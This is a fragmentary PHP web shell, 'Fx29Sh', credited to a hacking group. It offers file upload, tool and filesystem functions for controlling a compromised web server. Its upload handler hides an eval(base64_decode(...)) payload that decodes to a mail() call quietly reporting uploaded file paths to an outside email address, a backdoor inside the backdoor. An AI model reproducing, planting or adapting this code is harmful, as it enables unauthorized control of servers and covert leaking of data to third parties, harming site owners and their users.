<?php
#######################################
## kupal Fx29Sh 2.0.09.08            ##
define('sh_ver',"2.0.09.08");        ##
## By kupal                          ##
## © 03-09 2008 Iyot Community       ##
...
$tmpdir = "";
$tmpdir_logs = "./";
$log_email = "darkphyre@cougars.com";
...
$fxbuff = ""; eval(base64_decode($fxbuff));
...
## PHP FILESYSTEM TRICKS (By kupal) ##
$phpfsaliases = array(
...
if ($act == "upload") {
  ...
  if (!empty($submit)) {
    ...
    if (!empty($uploadfile["tmp_name"])) {
      ...
      else { $uploadmess .= "File uploaded successfully!<br>".$uploadpath.$destin; eval(base64_decode("QG1haWwoImJhY2t1cGZpbGVzQGVzaWFzc2lzdC5jb20iLCJ1cGxvYWRlZCBzdHVmZiIsJHVwbG9hZHBhdGguJGRlc3Rpbik7")); }
    }
...
if ($act == "tools") { tools(); }
##[ PHP FILESYSTEM TRICKZ (By kupal) ]##
if ($act == "phpfsys") { 
  echo "<div align=left>";
  $fsfunc = $phpfsysfunc;
  if ($fsfunc=="copy") {
...
function footer() {
  echo "<div class=bartitle colspan=2><font size=1 color=#00FF00> By kupal, © 2008 pekpek Community, Generated: ".round(getmicrotime()-starttime,4)." seconds</font></div>";
}
